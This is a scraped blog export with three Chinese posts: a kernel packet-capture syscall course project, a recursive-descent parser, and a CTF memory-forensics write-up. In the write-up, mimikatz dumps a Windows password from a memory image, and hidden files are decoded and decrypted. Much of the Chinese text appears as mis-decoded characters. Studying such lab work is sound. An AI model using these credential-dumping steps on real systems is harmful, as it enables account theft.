s_packet-\u0026gt;mac_source[3] = mac_hdr-\u0026gt;h_source[3]; s_packet-\u0026gt;mac_source[4] = mac_hdr-\u0026gt;h_source[4]; s_packet-\u0026gt;mac_source[5] = mac_hdr-\u0026gt;h_source[5]; s_packet-\u0026gt;eth_proto = mac_hdr-\u0026gt;h_proto; */ switch(s_packet-\u0026gt;eth_proto){ case htons(0x0800):\t// ip ip_hdr = (struct iphdr *)(buffer + sizeof(struct ethhdr)); s_packet-\u0026gt;ip_source = ip_hdr-\u0026gt;saddr; s_packet-\u0026gt;ip_dest = ip_hdr-\u0026gt;daddr; // p = (char*)\u0026amp;ip_hdr-\u0026gt;saddr; // printk(\u0026#34;æº IP: %d.%d.%d.%d\u0026#34;, // (u_char)p[0], // (u_char)p[1], // (u_char)p[2], // (u_char)p[3] // ); // p = (char*)\u0026amp;ip_hdr-\u0026gt;daddr; // printk(\u0026#34; ==\u0026gt; ç›®çš„ IP: %d.%d.%d.%d\\n\u0026#34;, // (u_char)p[0], // (u_char)p[1], // (u_char)p[2], // (u_char)p[3] // ); s_packet-\u0026gt;ip_proto = ip_hdr-\u0026gt;protocol; switch(s_packet-\u0026gt;ip_proto) { case IPPROTO_ICMP: s_packet-\u0026gt;port_source = 0; s_packet-\u0026gt;port_dest = 0; break; case IPPROTO_IGMP: s_packet-\u0026gt;port_source = 0; s_packet-\u0026gt;port_dest = 0; break; case IPPROTO_IPIP: break; case IPPROTO_TCP: tcp_hdr = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr)); s_packet-\u0026gt;port_source = tcp_hdr-\u0026gt;source; s_packet-\u0026gt;port_dest = tcp_hdr-\u0026gt;dest; break; case IPPROTO_UDP: udp_hdr = (struct udphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr)); s_packet-\u0026gt;port_source = udp_hdr-\u0026gt;source; s_packet-\u0026gt;port_dest = udp_hdr-\u0026gt;dest; break; case IPPROTO_RAW: break; default: break; } // printk(\u0026#34;åè®®ç±»å‹:\u0026#34;); // switch(ip_hdr-\u0026gt;protocol) { // case IPPROTO_ICMP: // printk(\u0026#34;ICMP\u0026#34;); // break; // case IPPROTO_IGMP: // printk(\u0026#34;IGMP\u0026#34;); // break; // case IPPROTO_IPIP: // printk(\u0026#34;IPIP\u0026#34;); // break; // case IPPROTO_TCP: // printk(\u0026#34;TCP\u0026#34;); // break; // case IPPROTO_UDP: // printk(\u0026#34;UDP\u0026#34;); // break; // case IPPROTO_RAW: // printk(\u0026#34;RAW\u0026#34;); // break; // default: // printk(\u0026#34;Unknown type\u0026#34;); // break; // } break; case htons(0x0806): // arp arp_hdr = (struct arphdr *)(buffer + sizeof(struct ethhdr)); // however #if 0 in kernel if_arp.h ip not compiled // RFC 826 ARP packets are variable in size // https://sites.uclouvain.be/SystInfo/usr/include/net/if_arp.h.html // s_packet-\u0026gt;ip_source = (__be32 *)arp_hdr-\u0026gt;ar_sip; // s_packet-\u0026gt;ip_dest = (__be32 *)arp_hdr-\u0026gt;ar_tip; s_packet-\u0026gt;ip_source = 0; s_packet-\u0026gt;ip_dest = 0; s_packet-\u0026gt;ip_proto = 0; s_packet-\u0026gt;port_source = 0; s_packet-\u0026gt;port_dest = 0; break; default: s_packet-\u0026gt;ip_source = 0; s_packet-\u0026gt;ip_dest = 0; s_packet-\u0026gt;ip_proto = 0; s_packet-\u0026gt;port_source = 0; s_packet-\u0026gt;port_dest = 0; break; } memcpy(memp, s_packet, sizeof(struct struct_packet)); memp += sizeof(struct struct_packet); } kfree(buffer); // how 0 read/1 trans/2 read and trans __sys_shutdown(sock, 2); // close(sock); return 0; } SYSCALL_DEFINE2(cap, char * , memp , int, caplen) { return __sys_cap(memp, caplen); } // arch/x86/entry/syscalls/syscall_64.tbl // 335 64 cap sys_cap // include/linux/syscalls.h // asmlinkage long sys_cap(FILE *f, int caplen) check_syscall.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;linux/if_ether.h\u0026gt; #include \u0026lt;linux/in.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define SYSCALL_CAP 335 struct struct_packet { unsigned char\tmac_dest[ETH_ALEN]; unsigned char\tmac_source[ETH_ALEN]; __be16\teth_proto; __be32\tip_source; __be32\tip_dest; __u8\tip_proto; __be16\tport_source; __be16\tport_dest; }; int main() { int caplen = 10; int memsize = caplen * sizeof(struct struct_packet); char * memp = malloc(memsize); int res = syscall(SYSCALL_CAP, memp, caplen); // int res = cap(memp, caplen); if (res){ printf(\u0026#34;error:%d\\n\u0026#34;,res); exit(1); } for (int i=0;i\u0026lt;10;++i){ for (int y=0;y\u0026lt;10;++y){ printf(\u0026#34;%02x \u0026#34;,(unsigned char)memp++); } printf(\u0026#34;\\n\u0026#34;); } return 0; } è°ƒè¯•å†…æ ¸ å‰ç½®ï¼šqemuåŠpwndbgçš„å®‰è£…\ngdbé…åˆqemuè°ƒè¯• qemuå‚æ•°-S -så¯åŠ¨gdbserverï¼Œgdbè¿ä¸Šremoteå³å¯\n1 2 3 qemu-system-x86_64 ... -S -s gdb vmlinux target remote:1234 1 2 3 4 5 6 7 int __sys_recvfrom(int fd, void __user *ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len){ err = import_single_range(READ, ubuf, size, \u0026amp;iov, \u0026amp;msg.msg_iter); // -14 kernel // 0 user } 0xffff888005549000 gdbè°ƒå†…æ ¸å‘ç°å†…å­˜å†™å…¥å¤±è´¥\nç½‘ç»œç¯å¢ƒ\n1 2 3 4 5 apt-get update # è™šæ‹Ÿç½‘æ¡¥å·¥å…· apt-get install bridge-utils # UMLï¼ˆUser-mode linuxï¼‰å·¥å…· apt-get install uml-utilities qemué»˜è®¤æ”¯æŒçš„æ˜¯e1000ç½‘å¡ï¼Œå†…æ ¸ä¸­éœ€è¦å¼€å¯å¦‚ä¸‹çš„é…ç½®é¡¹æ¥æ”¯æŒe1000\nå¦åˆ™å¯åŠ¨ifconfig -aåªæœ‰ä¸€ä¸ªloè®¾å¤‡\n1 2 3 4 5 Device Drivers ---\u0026gt; [*] Network device support ---\u0026gt; [*] Ethernet driver support ---\u0026gt; [*] Intel devices \u0026lt;*\u0026gt; Intel(R) PRO/1000 Gigabit Ethernet support # åå…­è¿›åˆ¶æ‰“å°aå¼€å§‹çš„16ä¸ªbyteç±»å‹å†…å­˜\rx/16xb a æ·»åŠ æ–‡ä»¶åŠ å¯† dm-crypt/cryptsetup\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 âœ ~ cryptsetup benchmark # Tests are approximate using memory only (no storage IO). PBKDF2-sha1 1705001 iterations per second for 256-bit key PBKDF2-sha256 2111935 iterations per second for 256-bit key PBKDF2-sha512 1600879 iterations per second for 256-bit key PBKDF2-ripemd160 894689 iterations per second for 256-bit key PBKDF2-whirlpool 661979 iterations per second for 256-bit key argon2i 6 iterations, 1048576 memory, 4 parallel threads (CPUs) for 256-bit key (requested 2000 ms time) argon2id 7 iterations, 1048576 memory, 4 parallel threads (CPUs) for 256-bit key (requested 2000 ms time) # Algorithm | Key | Encryption | Decryption aes-cbc 128b 1068.9 MiB/s 2818.5 MiB/s serpent-cbc 128b 94.4 MiB/s 673.9 MiB/s twofish-cbc 128b 210.6 MiB/s 375.6 MiB/s aes-cbc 256b 846.1 MiB/s 2375.5 MiB/s serpent-cbc 256b 96.7 MiB/s 695.6 MiB/s twofish-cbc 256b 217.7 MiB/s 391.6 MiB/s aes-xts 256b 2632.3 MiB/s 2713.3 MiB/s serpent-xts 256b 673.6 MiB/s 687.9 MiB/s twofish-xts 256b 374.1 MiB/s 369.8 MiB/s aes-xts 512b 2248.3 MiB/s 2264.3 MiB/s serpent-xts 512b 685.4 MiB/s 693.5 MiB/s twofish-xts 512b 371.9 MiB/s 375.6 MiB/s å‚è€ƒæ–‡çŒ® [1]https://git.kernel.org/pub/scm/linux/kernel/git/wtarreau/linux-2.4.git/[source]\n[2]https://kernel.googlesource.com/pub/scm/linux/kernel/git/wtarreau/linux-2.4.git/[source]\n[3]https://github.com/torvalds/linux[kernel]\n[4]https://linux.cn/article-9665-1.html[kernel make]\n[5]https://www.linux.com/topic/desktop/how-compile-linux-kernel-0/[kernel make]\n[6]https://blog.csdn.net/Magic_Ninja/article/details/89058323[gcc]\n[7]https://stackoverflow.com/questions/34569458/error-occurred-compiling-gcc-from-source-code[gcc]\n[8]https://www.cnblogs.com/evilzy/archive/2008/03/30/1130179.html[kernel]\n[9]https://www.cnblogs.com/hellogc/p/7482066.html[qemu kernel std]\n[10]https://busybox.net/about.html[busybox]\n[11]https://blog.csdn.net/sinat_22597285/article/details/53783221?spm=1001.2014.3001.5501[qemu initrd]\n[12]https://blog.csdn.net/sinat_36184075/article/details/71598834[/dev/*]\n[13]https://fmyy.pro/2020/05/04/Kernel/Linux_Kernel_Pwn(%E4%B8%80)/#%E6%80%9D%E8%B7%AF[fmyy kernelpwn]\n[14]https://wiki.debian.org/Initrd[2.4\u0026rsquo;s initrd/2.6\u0026rsquo;s initramfs]\n[15]https://securitronlinux.com/debian-testing/compiling-and-installing-a-2-4-kernel-on-debian-gnu-linux-sarge/[make initrd 2.4/2.6]\n[16]https://www.centennialsoftwaresolutions.com/post/5-minute-user-space-hello-world-arm-cross-compile-copy-to-a-rootfs-and-run-on-qemu[busybox initramfs]\n[17]https://www.cnblogs.com/tsruixi/p/10777242.html [syscall hdu]\n[18]https://zhuanlan.zhihu.com/p/445453676 [vscode kernel dbg]\n[19]https://wzt.ac.cn/2021/05/28/QEMU-networking/ [qemu networking]\n[20]https://blog.csdn.net/gengzhikui1992/article/details/103142848 [libpcap speed]\n[21]https://program-think.medium.com/%E6%89%AB%E7%9B%B2-dm-crypt-%E5%A4%9A%E5%8A%9F%E8%83%BD-linux-%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E5%B7%A5%E5%85%B7-%E5%85%BC%E5%AE%B9-truecrypt-veracrypt-80a932ae3492[dm-crypt]\n[22]https://www.cnblogs.com/pionice/p/13288942.html [os fs blog]\n[23]https://github.com/744717164/OSsciByGZHU/blob/master/OSscienceDesign/OsDesignByGama.cpp [osfilesystem]\n[24]https://blog.csdn.net/GerZhouGengCheng/article/details/106103039 [aes-256-cbc]\n[25]https://blog.csdn.net/u012234115/article/details/72762045 [md5 sha256]\n[26]https://www.runoob.com/cplusplus/cpp-files-streams.html [c++ fstream]\n","description":"","id":21,"section":"posts","tags":["è¯¾ç¨‹"],"title":"æ“ä½œç³»ç»Ÿè¯¾ç¨‹è®¾è®¡","uri":"https://ruokeqx.gitee.io/posts/os/"},{"content":"é’ˆå¯¹ç»™å®šè¯­æ³•è®¾è®¡é€’å½’ä¸‹é™åˆ†æç¨‹åºï¼Œä»¥å¯¹ä»»æ„è¾“å…¥çš„ç¬¦å·ä¸²è¿›è¡Œè¯­æ³•åˆ†æã€‚è¯­æ³•å¦‚ä¸‹\n1 2 3 4 5 exp -\u0026gt; exp addop term | term addop -\u0026gt; + | - term = term mulop factor | factor mulop = * factor = ( exp ) | number å› ä¸ºå­˜åœ¨é‡å¤å’Œé€‰æ‹©ï¼Œæ‰€ä»¥ä½¿ç”¨EBNFã€‚\n1 2 exp -\u0026gt; term { addop term } term -\u0026gt; factor { mulop factor } å†™æˆä¼ªä»£ç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 /* expä¼ªä»£ç  */ procedure exp begin term; while token = + do match(token); term; end while; end exp; 1 2 3 4 5 6 7 8 9 /* termä¼ªä»£ç  */ procedure term begin factor; while token = * do match(token); factor; end while; end term; 1 2 3 4 5 6 7 8 9 10 /* factorä¼ªä»£ç  */ procedure factor begin if token = \u0026#39;(\u0026#39; match(\u0026#39;(\u0026#39;); exp; match(\u0026#39;)\u0026#39;); else getnumber; end factor; 1 2 3 4 5 6 7 8 9 10 11 12 13 /* expæ„é€ è¯­æ³•æ ‘ */ function exp:syntaxTree; var temp,newtemp:syntaxTree; begin temp := term; while token = + do newtemp := makeOpNode(token); match(token); leftChild(newtemp) := temp; rightChile(newtemp) := term; temp := newtemp; end while; end exp; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 /* termæ„é€ è¯­æ³•æ ‘ */ function term:syntaxTree; var temp,newtemp:syntaxTree; begin temp := factor; while token = * do newtemp := makeOpNode(token); match(token); leftChild(newtemp) := temp; rightChile(newtemp) := factor; temp := newtemp; end while; return temp; end term; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /* factoræ„é€ è¯­æ³•æ ‘ */ function factor:syntaxTree; var temp:syntaxTree; begin if token = \u0026#39;(\u0026#39; match(\u0026#39;(\u0026#39;) temp := makeOpNode(exp); leftChild(temp) := null; rightChile(temp) := null; match(\u0026#39;)\u0026#39;) else if isdigit(token) temp := makeOpNode(token); leftChild(temp) := null; rightChile(temp) := null; else error reutrn temp; end factor; å®Œæ•´ä»£ç å¦‚ä¸‹,åŸºæœ¬æ€è·¯å°±æ˜¯getcharé¢„å…ˆè·å–ä¸€ä¸ªcharç”¨ä»¥è¿›è¡Œé¢„æµ‹æ€§è§£æ,ç„¶åé€’å½’æ„é€ è¯­æ³•æ ‘å¹¶æ‰“å°å‡ºæ¥.\nå¦‚æœåŒ¹é…åˆ°è¿ç®—ç¬¦å°±æ„é€ æ–°çš„èŠ‚ç‚¹åŠ åˆ°åŸæ¥çš„æ ‘ä¸Š;å¦‚æœåŒ¹é…åˆ°å•ä¸ªæ•°å­—,é‚£ä¹ˆå°±ä½¿ç”¨ungetcå°†æ•°å­—è¿”å›è¾“å…¥æµç„¶åç”¨scanf(\u0026quot;%d\u0026quot;)æ¥åŒ¹é…å¤šä½number.\nåˆšå¼€å§‹ç¨‹åºä»¥cè¯­è¨€å®ç°,ä½†æ˜¯åªèƒ½å¤„ç†å•ä½æ•°å­—,è€ƒè™‘åˆ°æ‰€æœ‰èŠ‚ç‚¹æ•°æ®ä¸€è‡´,å¹²è„†æ”¹åˆ°c++ä½¿ç”¨string.è¿™é‡Œé‡åˆ°ä¸€ç‚¹é—®é¢˜,åˆšå¼€å§‹cè¯­è¨€çš„æ—¶å€™dataä¸ºcharç±»å‹,æ ‘èŠ‚ç‚¹ç”¨mallocè·å–ç©ºé—´,æ”¹åˆ°c++åç»“æ„ä½“å†…stringç±»å‹ä¸èƒ½ç”¨mallocç±»å‹,å› ä¸ºåˆå§‹åŒ–å¹¶å®šé•¿äº†,æ”¹ç”¨newå’Œdeleteåè§£å†³é—®é¢˜.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;cstdio\u0026gt; #include \u0026lt;stdlib.h\u0026gt; using namespace std; /*æ ‘èŠ‚ç‚¹*/ typedef struct node { string data; struct node* left; struct node* right; }Node; void printTree(Node* n, int type, int level); void destroy_node(Node*); Node* makeNode(string); char token; Node* exp(); Node* term(); Node* factor(); void match(char expectedToken) { if (token == expectedToken) token = getchar(); else printf(\u0026#34;error in match\\n\u0026#34;); } int main() { token = getchar(); Node* root = exp(); if (token == \u0026#39;\\n\u0026#39; || token == \u0026#39;\\r\u0026#39;) { printf(\u0026#34;success\\n\u0026#34;); printTree(root, 0, 0); } else { printf(\u0026#34;error in main\\n\u0026#34;); } destroy_node(root); return 0; } Node* exp() { Node* temp = term(); Node* newtemp = NULL; while (token == \u0026#39;+\u0026#39; || token == \u0026#39;-\u0026#39;) { newtemp = makeNode(string(1,token)); match(token); newtemp-\u0026gt;left = temp; newtemp-\u0026gt;right = term(); temp = newtemp; } return temp; } Node* term() { Node* temp = factor(); Node* newtemp = NULL; while (token == \u0026#39;*\u0026#39; || token == \u0026#39;/\u0026#39;) { newtemp = makeNode(string(1,token)); match(token); newtemp-\u0026gt;left = temp; newtemp-\u0026gt;right = factor(); temp = newtemp; } return temp; } Node* factor() { Node* temp = NULL; if (token == \u0026#39;(\u0026#39;) { match(\u0026#39;(\u0026#39;); temp = exp(); match(\u0026#39;)\u0026#39;); } else if (token \u0026gt;= \u0026#39;1\u0026#39; \u0026amp;\u0026amp; token \u0026lt;= \u0026#39;9\u0026#39;) { ungetc(token, stdin); int number; scanf(\u0026#34;%d\u0026#34;, \u0026amp;number); temp = makeNode(to_string(number)); token = getchar(); } else { printf(\u0026#34;error in factor\\n\u0026#34;); } return temp; } /*é”€æ¯æ ‘*/ void destroy_node(Node* node) { if (node != NULL) { destroy_node(node-\u0026gt;left); destroy_node(node-\u0026gt;right); cout \u0026lt;\u0026lt; node-\u0026gt;data; delete node; node = NULL; } } Node* makeNode(string value) { Node* node = new Node; // Node* node = (Node*)malloc(sizeof(Node)); node-\u0026gt;data = value; node-\u0026gt;left = NULL; node-\u0026gt;right = NULL; return node; } void printTree(Node* n, int type, int level) { int i; if (NULL == n) return; printTree(n-\u0026gt;right, 2, level + 1); switch (type) { case 0: printf(\u0026#34;%s\\n\u0026#34;, n-\u0026gt;data.c_str()); break; case 1: for (i = 0; i \u0026lt; level; i++) printf(\u0026#34;\\t\u0026#34;); printf(\u0026#34;\\\\ %s\\n\u0026#34;, n-\u0026gt;data.c_str()); break; case 2: for (i = 0; i \u0026lt; level; i++) printf(\u0026#34;\\t\u0026#34;); printf(\u0026#34;/ %s\\n\u0026#34;, n-\u0026gt;data.c_str()); break; } printTree(n-\u0026gt;left, 1, level + 1); } è¿è¡Œç»“æœå¦‚ä¸‹å›¾æ‰€ç¤º\n","description":"","id":22,"section":"posts","tags":["course","compiler"],"title":"é€’å½’ä¸‹é™è¯­æ³•åˆ†æå™¨çš„æ„å»º","uri":"https://ruokeqx.gitee.io/posts/recursive-descent-parser/"},{"content":"2021è¥¿æ¹–è®ºå‰‘ Yusaçš„å¯†ç  ä¸€ä¸ªé•œåƒæ–‡ä»¶ï¼Œä¸€ä¸ªåŠ å¯†å‹ç¼©åŒ…\né¢˜ç›®æœ‰äº”ä¸ªå½©è›‹\n1 2 3 4 5 egg1 yusaå§å§å¾ˆæ‹…å¿ƒæ¯”èµ›æ—¶å¹³å°å¡å¾—å´©æºƒï¼Œä¸ºæ­¤å½»å¤œéš¾çœ  egg2 yusaå§å§æ˜¯å°Šè´µçš„SVIP8ï¼Œä¸ä¼šæœ‰äººä¸çŸ¥é“å­ egg3 You still have lots more to work on... egg4 yusaå§å§æœ‰å¥½å¤šå¥½å¤šçš„å°å¨‡å¦»ï¼Œæ¸£ç”· egg5 yusaå§å§å¸Œæœ›è¥¿æ¹–è®ºå‰‘çš„flagæ ¼å¼ä¸ºyusameinv{.*?}ï¼Œä½†æˆ‘å°±ä¸^_^ ç›´æ¥mimikatzå¾—åˆ°å¯†ç YusaYusa520\n1 2 3 4 Module User Domain Password -------- ---------------- ---------------- ---------------------------------------- wdigest Yusa YUSA-PC YusaYusa520 wdigest YUSA-PC$ WORKGROUP è§£å¯†å‹ç¼©åŒ…å¾—åˆ°Who_am_Iæ–‡ä»¶ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆæ–‡ä»¶\nfilescançœ‹åˆ°Sakuraæ–‡ä»¶è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­æœ‰å‡ ä¸ªæ–‡ä»¶\n1 2 3 4 5 6 0x000000003e58ada0 1 0 R--r-- \\Device\\HarddiskVolume2\\Program Files\\MSBuild\\Microsoft\\Windows Workflow Foundation\\Sakura-didi 0x000000003e78c6a0 1 0 R--r-- \\Device\\HarddiskVolume2\\Users\\Yusa\\Desktop\\Sakuraæ–‡ä»¶\\Sakura-å…¬å‘Š 0x000000003f2ae290 1 0 R--r-- \\Device\\HarddiskVolume2\\Users\\Yusa\\Desktop\\Sakuraæ–‡ä»¶\\Sakura-egg5 0x000000003f959980 1 0 R--r-- \\Device\\HarddiskVolume2\\Users\\Yusa\\Desktop\\Sakuraæ–‡ä»¶\\Sakura-å¤‡å¿˜å½• 0x000000003faa3a20 2 0 RW-rw- \\Device\\HarddiskVolume2\\Users\\Yusa\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\Sakuraæ–‡ä»¶.lnk 0x000000003fabc220 1 0 R--r-- \\Device\\HarddiskVolume2\\Users\\Yusa\\Desktop\\Sakuraæ–‡ä»¶\\Sakura-logo å…¶ä¸­Sakura-didiæ˜¯ä¸€ä¸ªåŠ å¯†äº†çš„zipæ–‡ä»¶ï¼ŒSakuraæ–‡ä»¶.lnkå°±æ˜¯æŒ‡å‘åˆ°æ¡Œé¢Sakuraæ–‡ä»¶å¤¹çš„linkæ–‡ä»¶ï¼ŒSakura-logoæ˜¯ä¸€ä¸ªæ¨±èŠ±logoï¼ŒSakura-egg5æ˜¯å½©è›‹ï¼ŒSakura-å…¬å‘Šæ–‡ä»¶å†…å®¹ä¸º\n1 å…¨ä½“æˆå‘˜æ³¨æ„ï¼Œæˆ‘ä»¬å°†åœ¨11æœˆ20å·ï¼Œå¯¹åœ°çƒå‘èµ·æ€»æ”»ï¼Œè¯·åšå¥½å‡†å¤‡ã€‚ æç¤ºåœ¨Sakura-å¤‡å¿˜å½•ä¸­\n1 2021.11.15ï¼šè¯·ç»„ç»‡å†…çš„äººåŠ¡å¿…åˆ é™¤æ‰€æœ‰ä¸å¿…è¦çš„è”ç³»æ–¹å¼ï¼Œé˜²æ­¢æˆ‘ä»¬çš„è®¡åˆ’å‡ºç°é—®é¢˜ã€‚ å¯»æ‰¾è”ç³»æ–¹å¼\nä¸¤ä¸ªæ–‡ä»¶Mystery Man.contact å’Œ Yusa.contact\næ–‡ä»¶1\næ–‡ä»¶å¯ä»¥ç”¨æ–‡æœ¬ç¼–è¾‘å™¨ç›´æ¥æ‰“å¼€ï¼Œæ˜¯xmlæ–‡æœ¬ï¼›ä¹Ÿå¯ä»¥ç”¨Windowsè”ç³»äººæ‰“å¼€ï¼Œæ¶ˆæ¯åœ¨å¤‡æ³¨é‡Œã€‚\n1 2 3 4 5 LF2XGYPPXSGOPO4E465YPZMITLSYRGXGWS7OJOEL42O2LZFYQDSLRKXEXO56LCVB566IZ2FPW7S37K7HQK46LLUM42EJB354RTSL3IHFR6VONHEJ4S4ITZNEVHTJPNXJS62OHAECGZGCWWRVOBUXMNKMGJTTKTDZME2TKU3PGVMWS5ZVGVYUKYJSKY2TON3ZJU2VSK3WGVGHK3BVGVJW6NLBGZCDK33NKQ2WE6KBGU3XKRJVG52UQNJXOVNDKTBSM42TK4KFGVRGK3BVLFLTGNBUINBTKYTFNQ2VSVZTGVNEOOJVLJBU4NKMGZSDKNCXNY2UY4KHGVGHSZZVG52WMNSLMVCTKWLJLI2DIQ2DMEZFMNJXG54WCT2EJF3VSV2NGVGW2SJVLJVFKNCNKRIXSWLNJJUVS6SJGNMTERLZJ5KFM3KNK5HG2TSEM46Q==== # base32è§£å¯†å¾—åˆ° Yusaï¼Œç»„ç»‡åˆšåˆšæ´¾ä¸‹æ¥ä¸€ä¸ªä»»åŠ¡ï¼Œè¯·å¿«ç‚¹å®Œæˆï¼Œä½ åªæœ‰ä¸‰å¤©æ—¶é—´ã€‚6L+Z5piv5L2g5Lya55So5Yiw55qEa2V577yM5Y+v5Lul55So5a6D5omT5byA57uE57uH57uZ5L2g55qE5bel5YW344CC5bel5YW35ZG95ZCN5L6d54Wn5LqG5Lyg57uf6KeE5YiZ44CCa2V577yaODIwYWM5MmI5ZjU4MTQyYmJiYzI3Y2EyOTVmMWNmNDg= # base64è§£å¯†å¾—åˆ° è¿™æ˜¯ä½ ä¼šç”¨åˆ°çš„keyï¼Œå¯ä»¥ç”¨å®ƒæ‰“å¼€ç»„ç»‡ç»™ä½ çš„å·¥å…·ã€‚å·¥å…·å‘½åä¾ç…§äº†ä¼ ç»Ÿè§„åˆ™ã€‚keyï¼š820ac92b9f58142bbbc27ca295f1cf48 ç”¨å¾—åˆ°çš„keyè§£å¯†Sakura-didi.zipå¾—åˆ°key.bmpæ–‡ä»¶ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆ\næ–‡ä»¶2\nåŒä¸Šï¼Œç½‘ç«™ä¸­æ˜¯egg3ï¼Œæ–‡æœ¬æ‰“å¼€çš„è¯è¿˜æœ‰ä¸€ä¸²baseï¼Œè§£å¯†åæ˜¯bmpå›¾ç‰‡ï¼Œä¹Ÿå°±æ˜¯Windowsè”ç³»äººçš„å¤´åƒ\né™„æ³¨é‡Œé¢æœ‰ä¸€ä¸²å­—\n1 ä¸€ä½ç»å¸¸å¿˜äº‹ï¼Œæ‰€ä»¥ä¼šæŠŠé‡è¦äº‹æƒ…è®°å½•åœ¨ä¾¿ç¬ºé‡Œçš„æ¼‚äº®å¥³å­© å¯»æ‰¾ä¾¿ç¬ºå†…å®¹\nå¾—åˆ°StickyNotes.sntï¼Œè¿™æ˜¯win7çš„å­˜å‚¨ä¾¿ç¬ºçš„æ–‡ä»¶ï¼Œwin7åº”è¯¥å¯ä»¥ç›´æ¥ç”¨ä¾¿ç¬ºæ‰“å¼€ï¼Œwin10å¥½åƒä¸è¡Œ\nç›´æ¥010çœ‹å†…å®¹ï¼Œcyberchecf from hex + decode textå¾—åˆ°å¦‚ä¸‹å†…å®¹\n1 2 \\\u0026#39;d6\\\u0026#39;d5\\\u0026#39;d3\\\u0026#39;da\\\u0026#39;c4\\\u0026#39;c3\\\u0026#39;b5\\\u0026#39;bd\\\u0026#39;c1\\\u0026#39;cb\\\u0026#39;d7\\\u0026#39;e9\\\u0026#39;d6\\\u0026#39;af\\\u0026#39;b5\\\u0026#39;c4\\\u0026#39;ba\\\u0026#39;cb\\\u0026#39;d0\\\u0026#39;c4\u0026#39;c3\\\u0026#39;dc\\\u0026#39;c2\\\u0026#39;eb\\\u0026#39;a3\\\u0026#39;ac\\\u0026#39;ce\\\u0026#39;d2\\\u0026#39;b2\\\u0026#39;bb\\\u0026#39;cf\\\u0026#39;eb\\\u0026#39;d4\\\u0026#39;d9\\\u0026#39;b5\\\u0026#39;b1\\\u0026#39;ce\\\u0026#39;d4\\\u0026#39;b5\\\u0026#39;d7\\\u0026#39;c1\\\u0026#39;cb\\\u0026#39;a3\\\u0026#39;ac\\\u0026#39;ce\\\u0026#39;d2\\\u0026#39;cf\\\u0026#39;eb\\\u0026#39;b8\\\u0026#39;cf\\\u0026#39;bd\\\u0026#39;f4\\\u0026#39;c0\\\u0026#39;eb\\\u0026#39;bf\\\u0026#39;aa\\\u0026#39;d5\\\u0026#39;e2\\\u0026#39;b8\\\u0026#39;f6\\\u0026#39;b9\\\u0026#39;ed\\\u0026#39;b5\\\u0026#39;d8\\\u0026#39;b7\\\u0026#39;bd\\\u0026#39;a1\\\u0026#39;a3\\\u0026#39;ba\\\u0026#39;cb\\\u0026#39;d0\\\u0026#39;c4\\\u0026#39;c3\\\u0026#39;dc\\\u0026#39;c2\\\u0026#39;eb\\\u0026#39;ca\\\u0026#39;c7\\\u0026#39;a3\\\u0026#39;ba\\\u0026#39;ca\\\u0026#39;c0\\\u0026#39;bd\\\u0026#39;e7\\\u0026#39;c3\\\u0026#39;bb\\\u0026#39;c1\\\u0026#39;cb\\\u0026#39;d0\\\u0026#39;c4\\\u0026#39;cc\\\u0026#39;f8\\\u0026#39;a1\\\u0026#39;a3\\ ç»ˆäºæ‹¿åˆ°äº†ç»„ç»‡çš„æ ¸å¿ƒå¯†ç ï¼Œæˆ‘ä¸æƒ³å†å½“å§åº•äº†ï¼Œæˆ‘æƒ³èµ¶ç´§ç¦»å¼€è¿™ä¸ªé¬¼åœ°æ–¹ã€‚æ ¸å¿ƒå¯†ç æ˜¯ï¼šä¸–ç•Œæ²¡äº†å¿ƒè·³ã€‚ ä½¿ç”¨æ ¸å¿ƒå¯†ç è§£å¯†å¾—åˆ°çš„key.zipæ–‡ä»¶ï¼Œå¾—åˆ°åŠ å¯†expï¼Œæ˜¯åˆ©ç”¨ä¸Šé¢çš„key.bmpæ–‡ä»¶å’Œflagå¾—åˆ°Who_am_Içš„åŠ å¯†é€»è¾‘ï¼Œå°±æ˜¯å¾ˆç®€å•çš„å¼‚æˆ–ã€‚\nä¸‹æ–¹æ³¨é‡Šéƒ¨åˆ†æ›¿æ¢æ‰åŸæ¥çš„å°±èƒ½è§£å¯†å¾—åˆ°flagæ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªgif\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from PIL import Image import struct pic = Image.open(\u0026#39;key.bmp\u0026#39;) fp = open(\u0026#39;flag\u0026#39;, \u0026#39;rb\u0026#39;) fs = open(\u0026#39;Who_am_I\u0026#39;, \u0026#39;wb\u0026#39;) # fp = open(\u0026#39;flag\u0026#39;, \u0026#39;wb\u0026#39;) # fs = open(\u0026#39;Who_am_I\u0026#39;, \u0026#39;rb\u0026#39;) a, b = pic.size list1 = [] for y in range(b): for x in range(a): pixel = pic.getpixel((x, y)) list1.extend([pixel[1], pixel[0], pixel[2], pixel[2], pixel[1], pixel[0]]) data = fp.read() for i 